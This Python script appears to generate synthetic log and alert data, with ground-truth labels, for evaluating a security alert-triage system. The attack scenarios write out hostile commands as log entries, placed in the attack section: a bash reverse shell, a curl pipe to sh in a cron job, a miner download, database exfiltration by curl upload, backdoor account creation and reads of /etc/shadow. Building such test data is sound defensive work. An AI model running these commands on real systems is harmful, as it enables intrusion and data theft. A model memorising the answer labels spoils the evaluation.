import json, re
from datetime import datetime, timedelta
from app.db import get_conn, init_db

FMT = "%Y-%m-%d %H:%M:%S"
BASE = datetime(2026, 10, 2)


def T(h, m=0, s=0):
    return (BASE + timedelta(hours=h, minutes=m, seconds=s)).strftime(FMT)


# real botnet C2 IPs from the Feodo list you downloaded in Step 7
import os
ips = []
for fn in ("data/feodo.txt", "data/feodo_aggressive.txt"):
    if os.path.exists(fn):
        ips += [l.strip() for l in open(fn) if re.fullmatch(r"\d+\.\d+\.\d+\.\d+", l.strip())]
ips = list(dict.fromkeys(ips))          # remove duplicates, keep order
bad = [i for i in ips if i not in ("162.243.103.246", "185.220.101.45")][:6]
if len(bad) < 6:
    raise SystemExit("data/feodo.txt needs at least 8 IPs. Re-download it (Step 7.3).")

logs, alerts, truth = [], [], {}


def log(ts, host, user, src, dst, etype, raw, process=""):
    logs.append((ts, host, user, src, dst, etype, process, raw))


def alert(aid, ts, rule, host, desc, sev):
    alerts.append((aid, ts, rule, host, desc, sev))


def label(aid, kind, accept, techniques):
    truth[aid] = {"kind": kind, "accept": accept, "techniques": techniques}


label("ALERT-001", "attack", ["true_positive"], ["T1110", "T1078", "T1105", "T1222", "T1571"])

# ---------- ATTACKS ----------
# EVAL-01 password spraying
h, ip = "eval-h01", bad[0]
users = ["alice", "bob", "carol", "dave", "erin", "frank", "grace", "heidi"]
for i in range(16):
    u = users[i % 8]
    log(T(3, 0, i * 5), h, u, ip, "10.0.1.11", "login_failed", f"Failed password for {u} from {ip}")
log(T(3, 3), h, "carol", ip, "10.0.1.11", "login_success", f"Accepted password for carol from {ip}")
log(T(3, 4), h, "carol", "10.0.1.11", "-", "process_exec", "cat /etc/passwd", "cat")
alert("EVAL-01", T(3, 3), "Password spraying then successful login", h,
      f"16 failed logins across 8 accounts from {ip}, then a successful login for carol.", "high")
label("EVAL-01", "attack", ["true_positive"], ["T1110", "T1078"])

# EVAL-02 reverse shell after login from listed IP
h, ip = "eval-h02", bad[1]
log(T(5, 0), h, "deploy", ip, "10.0.1.12", "login_success", f"Accepted publickey for deploy from {ip}")
log(T(5, 1), h, "deploy", "10.0.1.12", ip, "process_exec", f"bash -i >& /dev/tcp/{ip}/4444 0>&1", "bash")
log(T(5, 1, 20), h, "deploy", "10.0.1.12", ip, "network_connection", f"outbound connection to {ip}:4444", "bash")
log(T(5, 3), h, "deploy", "10.0.1.12", "-", "process_exec", "whoami; id; uname -a", "sh")
alert("EVAL-02", T(5, 0), "Login from threat-listed IP", h,
      f"Successful login for deploy from {ip}, an IP seen in botnet C2 feeds.", "high")
label("EVAL-02", "attack", ["true_positive"], ["T1078", "T1059", "T1571"])

# EVAL-03 crypto miner
h, ip = "eval-h03", bad[2]
log(T(7, 0), h, "ubuntu", ip, "10.0.1.13", "login_success", f"Accepted password for ubuntu from {ip}")
log(T(7, 1), h, "ubuntu", "10.0.1.13", "-", "process_exec", f"curl -s http://{ip}/xmrig.tgz -o /tmp/x.tgz", "curl")
log(T(7, 2), h, "ubuntu", "10.0.1.13", "-", "process_exec", "tar xzf /tmp/x.tgz -C /tmp && chmod +x /tmp/xmrig", "tar")
log(T(7, 3), h, "ubuntu", "10.0.1.13", ip, "network_connection",
    f"./xmrig -o stratum+tcp://{ip}:3333 -u wallet123 (CPU 98%)", "xmrig")
alert("EVAL-03", T(7, 0), "Login from threat-listed IP", h,
      f"Successful login for ubuntu from {ip}, followed by high CPU usage.", "high")
label("EVAL-03", "attack", ["true_positive"], ["T1078", "T1105", "T1496"])

# EVAL-04 data exfiltration
h, ip = "eval-h04", bad[3]
log(T(9, 0), h, "dbadmin", ip, "10.0.1.14", "login_success", f"Accepted password for dbadmin from {ip}")
log(T(9, 1), h, "dbadmin", "10.0.1.14", "-", "process_exec", "mysqldump --all-databases > /tmp/db.sql", "mysqldump")
log(T(9, 3), h, "dbadmin", "10.0.1.14", "-", "process_exec", "tar czf /tmp/db.tgz /tmp/db.sql", "tar")
log(T(9, 5), h, "dbadmin", "10.0.1.14", ip, "network_connection",
    f"outbound transfer 2.3 GB to {ip}:443 (curl -T /tmp/db.tgz https://{ip}/up)", "curl")
alert("EVAL-04", T(9, 5), "Large outbound transfer to external IP", h,
      f"2.3 GB sent from a database server to {ip} shortly after a login from the same IP.", "high")
label("EVAL-04", "attack", ["true_positive"], ["T1078", "T1560", "T1041|T1048"])

# EVAL-05 cron persistence
h, ip = "eval-h05", bad[4]
log(T(11, 0), h, "svc-backup", ip, "10.0.1.15", "login_success", f"Accepted password for svc-backup from {ip}")
log(T(11, 1), h, "svc-backup", "10.0.1.15", "-", "process_exec", "crontab -l", "crontab")
log(T(11, 2), h, "svc-backup", "10.0.1.15", "-", "process_exec",
    f"echo '*/5 * * * * curl -s http://{ip}/u.sh | sh' >> /var/spool/cron/crontabs/svc-backup", "bash")
alert("EVAL-05", T(11, 0), "Service account login from external IP", h,
      f"Service account svc-backup logged in interactively from {ip}.", "medium")
label("EVAL-05", "attack", ["true_positive"], ["T1078", "T1053"])

# EVAL-06 privilege escalation and backdoor account
h, ip = "eval-h06", bad[5]
log(T(13, 0), h, "dev", ip, "10.0.1.16", "login_success", f"Accepted password for dev from {ip}")
log(T(13, 1), h, "dev", "10.0.1.16", "-", "process_exec", "sudo -l", "sudo")
log(T(13, 2), h, "dev", "10.0.1.16", "-", "process_exec", "sudo useradd -m -s /bin/bash support2", "sudo")
log(T(13, 3), h, "dev", "10.0.1.16", "-", "process_exec", "sudo usermod -aG sudo support2", "sudo")
log(T(13, 4), h, "dev", "10.0.1.16", "-", "process_exec", "sudo cat /etc/shadow", "sudo")
alert("EVAL-06", T(13, 0), "Login from threat-listed IP", h,
      f"Successful login for dev from {ip}, an IP seen in botnet C2 feeds.", "high")
label("EVAL-06", "attack", ["true_positive"], ["T1078", "T1136", "T1548|T1003"])

# ---------- BENIGN ----------
# EVAL-07 user typo
h, ip = "eval-h07", "1.1.1.1"
for i in range(3):
    log(T(15, 0, i * 20), h, "alice", ip, "10.0.1.17", "login_failed", f"Failed password for alice from {ip}")
log(T(15, 2), h, "alice", ip, "10.0.1.17", "login_success", f"Accepted password for alice from {ip}")
log(T(15, 3), h, "alice", "10.0.1.17", "-", "process_exec", "cd /var/www/html && git pull origin main", "git")
alert("EVAL-07", T(15, 2), "Failed logins followed by success", h,
      f"alice had 3 failed logins from {ip} followed by a successful login.", "medium")
label("EVAL-07", "benign", ["false_positive"], [])

# EVAL-08 authorized vulnerability scan
h, ip = "eval-h08", "9.9.9.9"
for i in range(30):
    u = ["test", "oracle", "postgres", "ftpuser", "guest"][i % 5]
    log(T(16, 0, i * 4), h, u, ip, "10.0.1.18", "login_failed", f"Failed password for invalid user {u} from {ip}")
alert("EVAL-08", T(16, 2), "Brute force attempt", h,
      f"30 failed logins from {ip} against multiple accounts. Note: {ip} is the security team's scanner "
      f"during the weekly authorized vulnerability scan window (change ticket CHG-1042).", "high")
label("EVAL-08", "benign", ["false_positive", "needs_review"], [])

# EVAL-09 admin login from a new IP
h, ip = "eval-h09", "8.8.8.8"
log(T(17, 0), h, "admin", ip, "10.0.1.19", "login_success", f"Accepted publickey for admin from {ip}")
log(T(17, 1), h, "admin", "10.0.1.19", "-", "process_exec", "systemctl status nginx", "systemctl")
log(T(17, 2), h, "admin", "10.0.1.19", "-", "process_exec", "df -h", "df")
log(T(17, 3), h, "admin", "10.0.1.19", "-", "process_exec", "tail -n 50 /var/log/syslog", "tail")
alert("EVAL-09", T(17, 0), "Admin login from new IP", h,
      f"Admin login from {ip}, an IP not seen before for this account.", "medium")
label("EVAL-09", "benign", ["false_positive", "needs_review"], [])

# EVAL-10 legitimate software download
h = "eval-h10"
log(T(18, 0), h, "devops", "10.0.1.20", "-", "process_exec",
    "wget https://github.com/prometheus/node_exporter/releases/download/v1.8.1/node_exporter-1.8.1.linux-amd64.tar.gz "
    "&& tar xzf node_exporter-1.8.1.linux-amd64.tar.gz && systemctl start node_exporter", "wget")
alert("EVAL-10", T(18, 0), "Download from external URL", h,
      "User devops downloaded a file from github.com.", "medium")
label("EVAL-10", "benign", ["false_positive", "needs_review"], [])

# EVAL-11 scheduled backup
h = "eval-h11"
log(T(2, 0), h, "backup", "10.0.1.21", "-", "process_exec",
    "cron: nightly backup job started, syncing /var/backups to s3.amazonaws.com (scheduled 02:00 daily)", "cron")
log(T(2, 5), h, "backup", "10.0.1.21", "-", "network_connection",
    "outbound transfer 1.9 GB to s3.amazonaws.com:443", "aws")
alert("EVAL-11", T(2, 5), "Large outbound transfer", h,
      "Large outbound data transfer (1.9 GB) to s3.amazonaws.com.", "medium")
label("EVAL-11", "benign", ["false_positive", "needs_review"], [])

# ---------- save ----------
init_db()
conn = get_conn()
conn.execute("DELETE FROM logs WHERE host LIKE 'eval-%'")
conn.execute("DELETE FROM alerts WHERE alert_id LIKE 'EVAL-%'")
conn.executemany("INSERT INTO logs (timestamp,host,user,src_ip,dst_ip,event_type,process,raw) VALUES (?,?,?,?,?,?,?,?)", logs)
conn.executemany("INSERT INTO alerts (alert_id,timestamp,rule_name,host,description,severity_hint) VALUES (?,?,?,?,?,?)", alerts)
conn.commit()
conn.close()
json.dump(truth, open("data/eval_truth.json", "w"), indent=2)
print(f"{len(alerts)} alerts and {len(logs)} logs added. Ground truth saved for {len(truth)} alerts.")